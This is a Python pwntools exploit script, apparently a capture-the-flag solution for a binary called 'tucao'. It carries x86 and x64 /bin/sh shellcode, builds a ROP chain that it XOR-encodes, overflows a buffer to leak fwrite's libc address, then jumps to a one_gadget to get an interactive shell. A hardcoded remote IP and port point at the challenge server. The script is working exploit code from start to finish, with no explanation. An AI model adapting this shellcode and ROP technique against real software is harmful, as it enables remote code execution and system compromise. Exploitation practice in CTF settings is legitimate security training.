#!/usr/bin/env python
#coding:utf-8
from pwn import *

#ShellCode Reference
shellcode_x86="\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode_x64="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shellcode_x85_ascii="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"

# x86_64: rdi、rsi、rdx、rcx、r8 and r9.
#context.update(arch='i386')
#shellcode = asm(shellcraft.sh())
#context.terminal = ['tmux', 'splitw', '-v']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#frame = SigreturnFrame()

#Settings
context(arch='amd64',os='linux')
local=1
debug=1
is_libc=1

#Ifdebug
if debug == 1:
    context.log_level = 'debug'

#basic affairs
libc_elf = 0
file_elf = 0
filename="./tucao"
libc="./libc-2.23.so"
ip="39.108.52.84"
port=10000
file_elf = ELF(filename)

if local == 1:
    if is_libc == 1:
        libc_elf = ELF(libc)
        p = process(filename, env={"LD_PRELOAD":libc})
    else:
        p = process(filename)
else:
    p = remote(ip,port)

#Entry
def add(p,data):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("contents: ")
    p.sendline(data)

def post(p,n,offset):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("ID (0-4): ")
    p.sendline(str(n))
    p.recvuntil("> ")
    p.sendline(str(offset))

def quit(p):
    p.recvuntil("> ")
    p.sendline("4")

pop_rdi = 0x400fb3
fwrite_got = 0x602070
printf_plt = 0x400700
reader = 0x400aa1
data  = 0x6020b0
pop_rsi_r15 = 0x400fb1
leave_ret = 0x4008bc
one_gadget = 0x4526a

rop =  p64(pop_rdi) + p64(fwrite_got) + p64(printf_plt)
rop += p64(pop_rdi) + p64(data+0x50) + p64(pop_rsi_r15) + p64(0x8) + p64(0x0)
rop += p64(0x400aa1) + p64(leave_ret) 

rop = "".join(chr(ord(x)^0xff) for x in rop)

place = p64(data + 0x50 -0x8)
place = "".join(chr(ord(x)^0xff) for x in place)

add(p, "a"*25 + place + rop)
add(p,"b"*255)
add(p,"c"*255)
add(p,"d"*255)
add(p,"e"*255)
post(p , 4, -11)  #setbuf for /dev/null to 4.
post(p, 1 ,1)     #write 1 to buf4.fulfilled.
raw_input()
post(p, 0 ,0)     #overflow.
data = p.recv(1024)
temper = len(data.split("\n"))
#p.sendline("c"*100)
fwrite = u64(data.split("\n")[temper-1][:6]+"\x00"*2)
print "libc: " + str(hex(fwrite - libc_elf.symbols['fwrite']))
one = one_gadget + fwrite - libc_elf.symbols['fwrite']
p.sendline(p64(one))
p.interactive()








